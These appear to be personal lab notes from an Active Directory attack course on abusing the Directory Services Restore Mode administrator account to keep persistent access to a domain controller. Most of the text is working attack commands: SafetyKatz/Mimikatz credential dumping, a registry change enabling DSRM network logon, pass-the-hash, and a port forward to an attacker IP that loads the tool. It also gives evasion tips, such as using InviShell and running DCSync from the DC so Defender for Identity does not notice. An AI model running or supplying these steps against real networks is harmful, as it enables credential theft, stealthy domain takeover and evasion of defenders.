DSRM - Directory Services Restore Mode
- local administrator on every DC called "Administrator" whose password is the DSRM password
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed
- after altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC
- only thing longer in persistence than this is DPAPI backup keys
- almost never changes or documented -- if a DC goes down they would just go to daily backup


# Mimikatz

dump DSRM password
`SafetyKatz.exe "token::elevate" "lsadump::sam"`

compare the administrator hash with the administrator hash of below command
`SafetyKatz.exe "lsadump::lsa /patch"`

since it's the local administrator hash of the DC, we can pass the hash to authenticate
- logon behavior of the DSRM account needs to be changed before we can use the hash
`winrs -r:<hostname> cmd`
`reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`
- to detect this attack, you would watch for changes to this registry key


Pass-the-hash of DSRM administrator to access the DC
`SafetyKatz.exe "sekurlsa::pth /domain:<hostname> /user:Administrator /ntlm:<hash> /run:powershell.exe`
- nothing how the `/domain:` parameter only has the hostname and no domain for this case -- we are authenticating locally
`Set-Item WSMan:\localhost\Client\TrustedHosts <IP>`
`Enter-PSSession -ComputerName <IP> -Authentication NegotiateWithImplicitCredential`
- IP used here is the target machine




# Learning Objective

### Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence


port forward
`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>`
- if doing over winrs, remember to add `$null |` before the command

dump LSA
`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "tokne::elevate" "lsadump::evasive-sam" "exit"`
- if doing over winrs, remember to add `$null |` before the command

compare hash of DSRM Administrator with DA hash
![Pasted image 20260204060636](assets/Pasted%20image%2020260204060636.png)
- they are different, which is expected


change the registry for DSRM logon behavior
`reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`

in this case, they were logon type 9, so whoami said student1, but running the following showed administrator after
- logon type 9 - execute local application under current user identity, but using different credentials (from runas) for outbound network connections

start InviShell
`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

enter remote PS session with DSRM credentials
`Enter-PSSession -ComputerName <IP> -Authentication NegotiateWithImplicitCredential`
![Pasted image 20260204061139](assets/Pasted%20image%2020260204061139.png)

MDI only cares if you run a DCSync attack from outside the DC, so you can run it after doing this attack and not be detected
- this goes for a lot of other attacks too